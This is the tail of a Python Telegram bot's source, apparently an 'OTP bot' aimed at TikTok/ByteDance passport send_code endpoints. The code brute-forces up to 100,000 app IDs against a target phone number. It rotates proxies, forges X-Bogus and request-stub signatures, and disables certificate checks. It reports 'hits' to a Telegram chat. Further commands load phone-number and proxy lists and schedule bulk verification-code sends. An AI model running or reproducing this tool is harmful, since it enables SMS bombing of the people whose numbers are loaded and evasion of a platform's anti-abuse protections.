                       "X-SS-STUB": sigs.get("x-ss-stub", _hs.md5(body_str.encode()).hexdigest().upper())}
            ep = "/passport/mobile/send_code/v1/"
            r2 = s.post(f"https://{domain}{ep}?{url_qs}", data=body_str, headers=headers, verify=False, timeout=timeout)
            data = r2.json(); s.close()
            d = data.get("data", {}) if isinstance(data.get("data"), dict) else {}
            ec = d.get("error_code") or data.get("error_code"); msg = data.get("message", "")
            desc = d.get("description", "")[:60]; ticket = d.get("mobile_ticket", "")
            return {"aid": aid, "ec": ec, "msg": msg, "desc": desc, "success": msg == "success",
                    "ticket": ticket[:30], "domain": domain, "tc": tc_default, "type": "mobile"}
        except Exception as e:
            return {"aid": aid, "ec": None, "msg": "err", "desc": str(e)[:50], "success": False, "type": "mobile"}

    # ── VIP combo test ──
    VIP_AIDS = [4174, 6556, 4068, 5049, 2960, 473824, 1233, 1340, 364, 1180, 1988, 2658]
    VIP_TCS = [3536, 3635, 3637, 3634, 3734, 3532, 3733, 3531, 3633, 3736, 3537, 34, 3630]

    def _test_vip_combo(combo):
        aid, tc = combo
        try:
            proxy = random.choice(proxy_list)
            if not proxy.startswith("http"): proxy = f"http://{proxy}"
            s = requests.Session()
            s.headers["user-agent"] = _WEB_UA
            s.proxies = {"http": proxy, "https": proxy}; s.verify = False
            domain = "www.soundon.global"
            encoded = _encode_phone(phone)
            body = f"mix_mode=1&mobile={encoded}&type={tc}&language=en&fixed_mix_mode=1"
            params = {"aid": str(aid), "account_sdk_source": "web", "sdk_version": "2.1.10-tiktok", "language": "en"}
            qs = urlencode(params); params["X-Bogus"] = _xbogus(qs, body)
            r = s.post(f"https://{domain}/passport/web/send_code/", params=params, data=body,
                       headers={"content-type": "application/x-www-form-urlencoded",
                                "referer": f"https://{domain}/"}, timeout=timeout)
            s.close()
            data = r.json()
            d = data.get("data", {}) if isinstance(data.get("data"), dict) else {}
            ec = d.get("error_code"); msg = data.get("message", ""); desc = d.get("description", "")[:60]
            ticket = d.get("mobile_ticket", "")
            return {"aid": aid, "ec": ec, "msg": msg, "desc": desc, "success": msg == "success",
                    "ticket": ticket[:30], "domain": domain, "tc": tc, "type": "vip"}
        except Exception as e:
            return {"aid": aid, "ec": None, "msg": "err", "desc": str(e)[:50], "success": False,
                    "tc": tc, "type": "vip"}

    # ── Run scan ──
    successes = []
    total = 0
    done = [0]
    start_time = time.time()

    try:
        if mode == "vip":
            combos = [(aid, tc) for aid in VIP_AIDS for tc in VIP_TCS]
            total = len(combos)
            await context.bot.send_message(chat_id,
                f"<b>VIP Scan:</b> {len(VIP_AIDS)} AIDs x {len(VIP_TCS)} TCs = {total} combos\n"
                f"Workers: {TEST_WORKERS}", parse_mode="HTML")

            with ThreadPoolExecutor(max_workers=min(TEST_WORKERS, total)) as pool:
                futures = {pool.submit(_test_vip_combo, c): c for c in combos}
                for fut in as_completed(futures):
                    try:
                        r = fut.result()
                        done[0] += 1
                        if r.get("success"):
                            successes.append(r)
                            await context.bot.send_message(chat_id,
                                f"<b>VIP HIT!</b> aid={r['aid']} tc={r['tc']} domain={r['domain']}\n"
                                f"ticket={r.get('ticket','')}",
                                parse_mode="HTML")
                    except: pass
                    if done[0] % 50 == 0:
                        await context.bot.send_message(chat_id,
                            f"Progress: {done[0]}/{total} | Hits: {len(successes)}")

        else:
            # Web or Mobile: 100k AIDs
            total = 100000
            test_fn = _test_web if mode == "web" else _test_mobile
            aids = list(range(1, 100001))

            with ThreadPoolExecutor(max_workers=TEST_WORKERS) as pool:
                futures = {pool.submit(test_fn, aid): aid for aid in aids}
                for fut in as_completed(futures):
                    try:
                        r = fut.result()
                        done[0] += 1
                        if r.get("success"):
                            successes.append(r)
                            await context.bot.send_message(chat_id,
                                f"<b>HIT!</b> [{mode.upper()}] aid={r['aid']} tc={r.get('tc')} "
                                f"domain={r.get('domain','')}\nticket={r.get('ticket','')}",
                                parse_mode="HTML")
                    except: pass
                    if done[0] % 5000 == 0:
                        elapsed = time.time() - start_time
                        await context.bot.send_message(chat_id,
                            f"Progress: {done[0]:,}/{total:,} | Hits: {len(successes)} | "
                            f"Time: {elapsed:.0f}s")

        # ── Done: send summary + TXT file ──
        elapsed = time.time() - start_time
        summary = (
            f"<b>Scan Complete!</b>\n\n"
            f"Mode: {mode.upper()}\n"
            f"Tested: {done[0]:,}\n"
            f"Success: {len(successes)}\n"
            f"Time: {elapsed:.0f}s ({elapsed/60:.1f}min)\n"
        )
        if successes:
            summary += "\n<b>Working Combinations:</b>\n"
            for r in successes:
                summary += f"  aid={r['aid']} tc={r.get('tc')} domain={r.get('domain','')}\n"

        await context.bot.send_message(chat_id, summary, parse_mode="HTML")

        # Send TXT file with results
        if successes:
            txt_content = f"AID Brute Force Results — {mode.upper()}\n"
            txt_content += f"Date: {time.strftime('%Y-%m-%d %H:%M:%S UTC')}\n"
            txt_content += f"Tested: {done[0]:,} | Success: {len(successes)} | Time: {elapsed:.0f}s\n"
            txt_content += f"Phone: {phone} | TC: {tc_default}\n"
            txt_content += "=" * 60 + "\n\n"
            for r in successes:
                txt_content += (
                    f"AID: {r['aid']}\n"
                    f"  Type: {r.get('type','')}\n"
                    f"  TC: {r.get('tc','')}\n"
                    f"  Domain: {r.get('domain','')}\n"
                    f"  Ticket: {r.get('ticket','')}\n"
                    f"  Desc: {r.get('desc','')}\n\n"
                )
            buf = BytesIO(txt_content.encode())
            buf.name = f"bf_results_{mode}_{int(time.time())}.txt"
            await context.bot.send_document(chat_id, document=buf,
                caption=f"AID Brute Force — {len(successes)} hits found")
        else:
            await context.bot.send_message(chat_id, "No successful AIDs found in this scan.")

    except Exception as e:
        await context.bot.send_message(chat_id, f"Scan error: {str(e)[:200]}")


# ============================================
# MAIN
# ============================================

def main():
    if not SIGNERPY_AVAILABLE:
        logger.error("SignerPy not available! Bot may not work correctly.")
    
    # Build application with high concurrency settings
    application = (
        Application.builder()
        .token(BOT_TOKEN)
        .concurrent_updates(True)
        .connection_pool_size(100)
        .pool_timeout(30.0)
        .connect_timeout(30.0)
        .read_timeout(30.0)
        .write_timeout(30.0)
        .build()
    )
    
    # Command handlers
    application.add_handler(CommandHandler("start", start_command))
    application.add_handler(CommandHandler("help", help_command))
    application.add_handler(CommandHandler("status", status_command))
    application.add_handler(CommandHandler("stats", stats_command))
    application.add_handler(CommandHandler("single", single_command))
    application.add_handler(CommandHandler("bulk", bulk_command))
    application.add_handler(CommandHandler("schedule", schedule_command))
    application.add_handler(CommandHandler("schedulesep", schedulesep_command))
    application.add_handler(CommandHandler("scheduled", scheduled_command))
    application.add_handler(CommandHandler("cancelschedule", cancelschedule_command))
    application.add_handler(CommandHandler("setnumbers", setnumbers_command))
    application.add_handler(CommandHandler("setproxies", setproxies_command))
    application.add_handler(CommandHandler("uploadnumbers", uploadnumbers_command))
    application.add_handler(CommandHandler("uploadproxies", uploadproxies_command))
    application.add_handler(CommandHandler("clearnumbers", clearnumbers_command))
    application.add_handler(CommandHandler("clearproxies", clearproxies_command))
    application.add_handler(CommandHandler("tasks", tasks_command))
    application.add_handler(CommandHandler("cancel", cancel_command))
    application.add_handler(CommandHandler("apps", apps_command))
    application.add_handler(CommandHandler("setapp", setapp_command))
    application.add_handler(CommandHandler("apps2", apps2_command))
    application.add_handler(CommandHandler("setapp2", setapp2_command))
    application.add_handler(CommandHandler("zijie", zijie_command))
    application.add_handler(CommandHandler("zijiesingle", zijiesingle_command))
    application.add_handler(CommandHandler("setsep", setsep_command))
    application.add_handler(CommandHandler("sep", sep_command))
    application.add_handler(CommandHandler("setdelay", setdelay_command))
    application.add_handler(CommandHandler("done", done_command))
    application.add_handler(CommandHandler("test", test_command))
    
    # Short command aliases
    application.add_handler(CommandHandler("unum", uploadnumbers_command))
    application.add_handler(CommandHandler("uprox", uploadproxies_command))
    application.add_handler(CommandHandler("snum", setnumbers_command))
    application.add_handler(CommandHandler("sprox", setproxies_command))
    application.add_handler(CommandHandler("cnum", clearnumbers_command))
    application.add_handler(CommandHandler("cprox", clearproxies_command))
    application.add_handler(CommandHandler("csched", cancelschedule_command))
    application.add_handler(CommandHandler("schsep", schedulesep_command))
    application.add_handler(CommandHandler("zsingle", zijiesingle_command))
    application.add_handler(CommandHandler("delay", setdelay_command))
    application.add_handler(CommandHandler("sched", schedule_command))

    # Callback handler
    application.add_handler(CallbackQueryHandler(button_callback))
    
    # Message handlers
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    application.add_handler(MessageHandler(filters.Document.ALL, handle_document))
    
    logger.info("🚀 Pipix OTP Bot v7.0 starting...")
    logger.info(f"⚡ Max Concurrent OTP: {MAX_CONCURRENT_OTP}")
    logger.info(f"📊 Log Interval: Every {LOG_INTERVAL} requests")
    logger.info(f"⏰ Schedule Feature: Enabled")
    
    application.run_polling(allowed_updates=Update.ALL_TYPES, drop_pending_updates=True)


if __name__ == "__main__":
    main()
